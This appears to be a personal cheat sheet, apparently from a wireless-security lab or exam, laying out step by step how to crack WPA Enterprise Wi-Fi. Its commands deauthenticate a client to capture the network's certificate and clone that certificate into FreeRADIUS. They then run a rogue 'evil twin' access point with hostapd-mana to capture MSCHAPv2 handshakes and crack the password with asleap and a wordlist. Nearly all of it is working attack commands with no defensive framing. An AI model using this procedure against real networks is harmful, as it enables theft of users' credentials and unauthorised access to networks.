# Cracking WPA Enterprise

```bash
# Get Certificate
## Kill processes
sudo airmon-ng check kill
## Put wlan0 into monitor mode to create interface wlan0mon
sudo airodump-ng wlan0mon
## Gather channel ESSID & BSSID
## Restart the capture on the same channel as the AP
sudo airodump-ng -c 2 -w Playtronics wlan0mon
## Deauthenticate a client to get a certificate -a BSSID -c Station
sudo aireplay-ng -0 1 -a E8:9F:80:03:63:4A -c 40:B8:9A:F4:BB:19 wlan0mon
## Disable monitor mode
sudo airmon-ng stop wlan0mon
## Open capture file with Wireshark to locate certificate
sudo wireshark Playtronics-01.cap
## Filter capture file to find exam frame
wlan.bssid==E8:9F:80:03:63:4A && eap && tls.handshake.certificate
## In the found packet expand 'Extensible Authentication Protocol' then
## 'Transport Layer Security' then 'TLSv1.2 Record Layer: Handshake Protocol: Certificate' 
## then 'Handshake Protocol: Certificate' then 'Certificates' then right click on
## first certificate and 'Export packet bytes' to save file with DER extension

## Display certificate information
openssl x509 -inform der -in cert.der -text

# Freeradius
## Install freeradius
sudo apt install freeradius
## Configure ca.cnf
sudo nano /etc/freeradius/3.0/certs/ca.cnf
## Modify [certificate_authority] fields lines 49 - 55
## Update the server file
sudo nano /etc/freeradius/3.0/certs/server.cnf
## Modify [server] fields lines 49 - 54
## Rebuild certificates
### Run interactice root session
sudo -s
### Change to certifcates directory
cd /etc/freeradius/3.0/certs/
### Delete dh
rm dh
### Run make ignore error
make
### If certifcates already exist
make destroycerts

# Create access point
## Create host-apd-mana configuration file
sudo nano /etc/hostapd-mana/mana.conf
## Set SSID to that of the target
## Set certificates to be those that were created earlier

## Create EAP user file referenced in the configuration
sudo nano /etc/hostapd-mana/mana.eap_user

*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]

## Start hostapd-mana
sudo hostapd-mana /etc/hostapd-mana/mana.conf
## Wait for client to connect

# Crack the password
asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/john/password.lst

## If client don't connect use aire-replayng to deauthenticate clients. 
```
